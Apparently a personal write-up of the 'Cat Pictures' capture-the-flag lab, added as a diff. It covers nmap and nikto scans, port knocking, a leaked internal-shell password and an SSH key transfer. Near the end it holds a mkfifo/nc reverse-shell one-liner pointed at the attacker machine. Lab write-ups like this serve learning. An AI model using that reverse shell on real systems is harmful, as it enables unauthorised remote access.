@@ -1,0 +1,266 @@
+Name: Cat Pictures
+Date: 09/05/2022
+Difficulty: Easy
+Description: I made a forum where you can post cute cat pictures!
+Better Description: Cat person makes a docker jail 
+Goals:  UNDERSTAND docker more.
+Learnt: Port knocking in CTFs is not fun; more Docker; got to use nc -N transfers
+
+These are noting learning about docker and redoing the docker rodeo room for more practice and notes.
+Credit https://0xsanz.medium.com/cat-pictures-b1da1fe0b40a for the help.
+
+
+
+
+root@ip-10-10-140-81:~# ping -c 3 10.10.115.68
+PING 10.10.115.68 (10.10.115.68) 56(84) bytes of data.
+64 bytes from 10.10.115.68: icmp_seq=1 ttl=64 time=0.918 ms
+64 bytes from 10.10.115.68: icmp_seq=2 ttl=64 time=0.443 ms
+64 bytes from 10.10.115.68: icmp_seq=3 ttl=64 time=0.422 ms
+
+--- 10.10.115.68 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2039ms
+rtt min/avg/max/mdev = 0.422/0.594/0.918/0.229 ms
+root@ip-10-10-140-81:~# nmap -sC -sV -p- 10.10.115.68 --min-rate 5000
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-05-09 12:43 BST
+Nmap scan report for ip-10-10-115-68.eu-west-1.compute.internal (10.10.115.68)
+Host is up (0.00059s latency).
+Not shown: 65530 closed ports
+PORT     STATE    SERVICE      VERSION
+21/tcp   filtered ftp
+22/tcp   open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
+|   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
+|_  256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (EdDSA)
+2375/tcp filtered docker
+4420/tcp open     nvm-express?
+| fingerprint-strings: 
+|   DNSVersionBindReq, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
+|     INTERNAL SHELL SERVICE
+|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
+|     ctrl-c
+|     Please enter password:
+|     Invalid password...
+|     Connection Closed
+|   NULL, RPCCheck: 
+|     INTERNAL SHELL SERVICE
+|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
+|     ctrl-c
+|_    Please enter password:
+8080/tcp open     http         Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
+|_http-title: Cat Pictures - Index page
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port4420-TCP:V=7.60%I=7%D=5/9%Time=6278FE96%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,A0,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x
+SF:20do\x20not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20are
+SF:\x20fixing\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\n
+SF:Please\x20enter\x20password:\n")%r(GenericLines,C6,"INTERNAL\x20SHELL\x
+SF:20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x20at
+SF:\x20the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20at\x2
+SF:0the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20passwo
+SF:rd:\nInvalid\x20password\.\.\.\nConnection\x20Closed\n")%r(GetRequest,C
+SF:6,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x20d
+SF:o\x20not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20are\x2
+SF:0fixing\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPle
+SF:ase\x20enter\x20password:\nInvalid\x20password\.\.\.\nConnection\x20Clo
+SF:sed\n")%r(HTTPOptions,C6,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note:
+SF:\x20cd\x20commands\x20do\x20not\x20work\x20at\x20the\x20moment,\x20the\
+SF:x20developers\x20are\x20fixing\x20it\x20at\x20the\x20moment\.\ndo\x20no
+SF:t\x20use\x20ctrl-c\nPlease\x20enter\x20password:\nInvalid\x20password\.
+SF:\.\.\nConnection\x20Closed\n")%r(RTSPRequest,C6,"INTERNAL\x20SHELL\x20S
+SF:ERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x20at\x2
+SF:0the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20at\x20th
+SF:e\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20password:
+SF:\nInvalid\x20password\.\.\.\nConnection\x20Closed\n")%r(RPCCheck,A0,"IN
+SF:TERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20
+SF:not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20are\x20fixi
+SF:ng\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x
+SF:20enter\x20password:\n")%r(DNSVersionBindReq,C6,"INTERNAL\x20SHELL\x20S
+SF:ERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x20at\x2
+SF:0the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20at\x20th
+SF:e\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20password:
+SF:\nInvalid\x20password\.\.\.\nConnection\x20Closed\n");
+MAC Address: 02:1B:74:14:D2:C5 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 88.33 seconds
+
+
+root@ip-10-10-140-81:~# nikto -h 10.10.115.68:8080
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.10.115.68
++ Target Hostname:    ip-10-10-115-68.eu-west-1.compute.internal
++ Target Port:        8080
++ Start Time:         2022-05-09 12:44:47 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
++ Cookie phpbb3_6fb71_u created without the httponly flag
++ Cookie phpbb3_6fb71_k created without the httponly flag
++ Cookie phpbb3_6fb71_sid created without the httponly flag
++ Retrieved x-powered-by header: PHP/7.3.27
++ The anti-clickjacking X-Frame-Options header is not present.
++ Uncommon header 'referrer-policy' found, with contents: strict-origin-when-cross-origin
++ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
++ Server leaks inodes via ETags, header found with file /web.config, fields: 0x499 0x5ba106e572040 
++ OSVDB-3092: /web.config: ASP config file is accessible.
++ Cookie phpbb3_6fb71_lang created without the httponly flag
++ OSVDB-3092: /download/: This might be interesting...
++ 6544 items checked: 0 error(s) and 11 item(s) reported on remote host
++ End Time:           2022-05-09 12:46:49 (GMT1) (122 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+webpage contains comment: http://10.10.115.68:8080/viewtopic.php?f=2&t=2
+
+By the site admin called user.
+
+It is hint for port knocking against 1111, 2222, 3333, 4444.Something I have never done. Did research:
+https://sushant747.gitbooks.io/total-oscp-guide/content/port_knocking.html
+
+root@ip-10-10-140-81:~# for port in 1111 2222 3333 4444; do nmap -Pn --host_timeout 201 --max-retries 0 -p $port 10.10.115.68; done
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-05-09 13:23 BST
+Warning: 10.10.115.68 giving up on port because retransmission cap hit (0).
+Nmap scan report for ip-10-10-115-68.eu-west-1.compute.internal (10.10.115.68)
+Host is up (0.00011s latency).
+
+PORT     STATE    SERVICE
+1111/tcp filtered lmsocialserver
+MAC Address: 02:1B:74:14:D2:C5 (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-05-09 13:23 BST
+Warning: 10.10.115.68 giving up on port because retransmission cap hit (0).
+Nmap scan report for ip-10-10-115-68.eu-west-1.compute.internal (10.10.115.68)
+Host is up (0.00013s latency).
+
+PORT     STATE    SERVICE
+2222/tcp filtered EtherNetIP-1
+MAC Address: 02:1B:74:14:D2:C5 (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-05-09 13:23 BST
+Warning: 10.10.115.68 giving up on port because retransmission cap hit (0).
+Nmap scan report for ip-10-10-115-68.eu-west-1.compute.internal (10.10.115.68)
+Host is up (0.00015s latency).
+
+PORT     STATE    SERVICE
+3333/tcp filtered dec-notes
+MAC Address: 02:1B:74:14:D2:C5 (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-05-09 13:23 BST
+Warning: 10.10.115.68 giving up on port because retransmission cap hit (0).
+Nmap scan report for ip-10-10-115-68.eu-west-1.compute.internal (10.10.115.68)
+Host is up (0.00013s latency).
+
+PORT     STATE    SERVICE
+4444/tcp filtered krb524
+MAC Address: 02:1B:74:14:D2:C5 (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds
+
+
+root@ip-10-10-140-81:~# nmap -sC -sV -p- 10.10.115.68 --min-rate 5000
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-05-09 13:24 BST
+Nmap scan report for ip-10-10-115-68.eu-west-1.compute.internal (10.10.115.68)
+Host is up (0.00051s latency).
+Not shown: 65530 closed ports
+PORT     STATE    SERVICE      VERSION
+21/tcp   filtered ftp
+22/tcp   open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
+|   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
+|_  256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (EdDSA)
+2375/tcp filtered docker
+4420/tcp open     nvm-express?
+| fingerprint-strings: 
+|   DNSVersionBindReq, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
+|     INTERNAL SHELL SERVICE
+|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
+|     ctrl-c
+|     Please enter password:
+|     Invalid password...
+|     Connection Closed
+|   NULL, RPCCheck: 
+|     INTERNAL SHELL SERVICE
+|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
+|     ctrl-c
+|_    Please enter password:
+8080/tcp open     http         Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
+|_http-title: Cat Pictures - Index page
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port4420-TCP:V=7.60%I=7%D=5/9%Time=62790826%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,A0,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x
+SF:20do\x20not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20are
+SF:\x20fixing\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\n
+SF:Please\x20enter\x20password:\n")%r(GenericLines,C6,"INTERNAL\x20SHELL\x
+SF:20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x20at
+SF:\x20the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20at\x2
+SF:0the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20passwo
+SF:rd:\nInvalid\x20password\.\.\.\nConnection\x20Closed\n")%r(GetRequest,C
+SF:6,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x20d
+SF:o\x20not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20are\x2
+SF:0fixing\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPle
+SF:ase\x20enter\x20password:\nInvalid\x20password\.\.\.\nConnection\x20Clo
+SF:sed\n")%r(HTTPOptions,C6,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note:
+SF:\x20cd\x20commands\x20do\x20not\x20work\x20at\x20the\x20moment,\x20the\
+SF:x20developers\x20are\x20fixing\x20it\x20at\x20the\x20moment\.\ndo\x20no
+SF:t\x20use\x20ctrl-c\nPlease\x20enter\x20password:\nInvalid\x20password\.
+SF:\.\.\nConnection\x20Closed\n")%r(RTSPRequest,C6,"INTERNAL\x20SHELL\x20S
+SF:ERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x20at\x2
+SF:0the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20at\x20th
+SF:e\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20password:
+SF:\nInvalid\x20password\.\.\.\nConnection\x20Closed\n")%r(RPCCheck,A0,"IN
+SF:TERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20
+SF:not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20are\x20fixi
+SF:ng\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x
+SF:20enter\x20password:\n")%r(DNSVersionBindReq,C6,"INTERNAL\x20SHELL\x20S
+SF:ERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x20at\x2
+SF:0the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20at\x20th
+SF:e\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20password:
+SF:\nInvalid\x20password\.\.\.\nConnection\x20Closed\n");
+MAC Address: 02:1B:74:14:D2:C5 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 87.43 seconds
+
+
+You have to perform the port knocking multiple times, which makes this a very CTF-y kind of obsticle.
+FTP becomes open rather filtered with anonymous login; get the note.txt
+root@ip-10-10-128-153:~# cat note.txt 
+In case I forget my password, I'm leaving a pointer to the internal shell service on the server.
+
+Connect to port 4420, the password is sardinethecat.
+- catlover
+
+Get a limit shell so make another with:
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.128.153 9999 >/tmp/f
+rebecca
+Please enter yout password: 
+Welcome, catlover! SSH key transfer queued! 
+touch /tmp/gibmethesshkey
+Access Denied
+
+nc -N IP $PORT < id_rsa
+ssh in and you are root; but inside a container.
+At this point am I stilll unsure how you know you are in a docker container.
+Researching..
+...
+pspy is the asnwer.
